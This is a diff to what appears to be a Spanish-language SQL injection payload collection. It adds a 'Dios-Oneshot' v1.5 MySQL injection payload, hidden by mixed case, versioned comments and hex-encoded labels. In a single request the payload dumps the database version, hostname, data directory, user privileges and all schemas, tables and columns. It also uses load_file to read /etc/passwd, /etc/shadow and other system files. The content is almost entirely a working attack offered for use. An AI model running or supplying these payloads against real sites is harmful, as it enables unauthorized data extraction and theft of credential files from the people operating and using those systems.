@@ -1192,7 +1192,7 @@ uNion%20sElECt%20%2F*%21%20dAtaBaSE()%20*%2F%2b--%2b
 
 ```
 
-## Personal v1
+## Personal v1.5
 
 Dios-Oneshot personal
 
@@ -1207,5 +1207,20 @@ V1 cuenta con:
 
 ```
 /*!50000cOnCat*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c62723e,0x3c613e50726976696c6567696f733a203c2f613e,0x3c62723e,(/*!50000SElECT*/+/*!50000GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)*/+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c62723e,0x3c613e546f74616c204261736573206465206461746f733a203c2f613e,0x3c62723e,(SELECT+count(/*!50000cOnCat*/(schema_name))+FROM+INFORMATION_SCHEMA.schemata),0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c613e42617365206465206461746f73207574696c697a6164613a203c2f613e,0x3c62723e,database(),0x3c62723e,0x3c62723e,0x3c613e4e756d65726f206465207461626c61733a203c2f613e,0x3c62723e,(SELECT+count(CONCAT(table_name))+FROM+INFORMATION_SCHEMA.tables+where+table_schema=database()),0x3c62723e,0x3c62723e,0x3c613e5461626c617320792073757320636f6c756d6e61733a203c2f613e,0x3c62723e,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x))
+
+```
+V1.5 cuenta con:
+
+- Verision de base de datos
+- Hostname
+- Privilegios
+- Cuenta y enumeracion de todas las bases de datos
+- Cuenta y enumeracion de todas las tablas de la base de datos
+  actual con sus respectivas columnas
+- Se implementó la función IFNULL para pasar a local fire read si es que se tienen los permisos 
+
+
+```
+/*!50000cOnCat*/(0x3c68313e5f59303030215f3c2f68313e,0x3c703e56657273696f6e3a203c2f703e,@@version,0x3c62723e,0x3c703e486f73746e616d653a203c2f703e,@@hostname,0x3c62723e,0x3c62723e,0x3c613e4469726563746f72696f20696e7374616c63696f6e2062617365206465206461746f733a203c2f613e,@@datadir,0x3c62723e,0x3c62723e,0x3c613e50726976696c6567696f733a203c2f613e,0x3c62723e,(/*!50000SElECT*/+/*!50000GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)*/+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES),0x3c62723e,0x3c613e4c69737461206465207573756172696f733a203c2f613e,0x3c62723e,(/*!50000SElECT*/+/*!50000IFNULL(group_concat(grantee,privilege_type,is_grantable,0x3c62723e),'NO CUENTAS CON PERMISOS')*/+FROM information_schema.user_privileges WHERE privilege_type = 'SUPER'),0x3c62723e,0x3c62723e,0x3c613e546f74616c204261736573206465206461746f733a203c2f613e,0x3c62723e,(SELECT+count(/*!50000cOnCat*/(schema_name))+FROM+INFORMATION_SCHEMA.schemata),0x3c62723e,0x3c703e446174616261736573203a203c2f703e,(select%20grouP_ConCat(/*!50000schema_name/**8**/*/,0x3c62723e)+/*!50000fRom/**8**/*/+/*!50000iNfoRmAtiOn_sChEmA/**_**/.ScHeMaTa*/),0x3c62723e,0x3c613e42617365206465206461746f73207574696c697a6164613a203c2f613e,0x3c62723e,database(),0x3c62723e,0x3c62723e,0x3c613e4e756d65726f206465207461626c61733a203c2f613e,0x3c62723e,(SELECT+count(CONCAT(table_name))+FROM+INFORMATION_SCHEMA.tables+where+table_schema=database()),0x3c62723e,0x3c62723e,0x3c613e5461626c617320792073757320636f6c756d6e61733a203c2f613e,0x3c62723e,(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x),0x3c62723e,0x3c62723e,0x3c613e4c6f63616c2066696c65207265616420284c696e7578293a203c2f613e,0x3c62723e,0x3c62723e,0x3c613e2f6574632f7061737377643a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/passwd')),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0x3c613e2f6574632f736861646f773a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/shadow')),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0x3c613e2f6574632f67726f75703a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/group')),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0x3c613e2f6574632f686f7374733a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/hosts')),'NO CUENTAS CON PERMISOS')),0x3c62723e,0x3c62723e,0x3c613e2f6574632f6f732d72656c656173653a203c2f613e,0x3c62723e,(select+ifnull(concat(load_file('/etc/os-release')),'NO CUENTAS CON PERMISOS')))
 
 ```
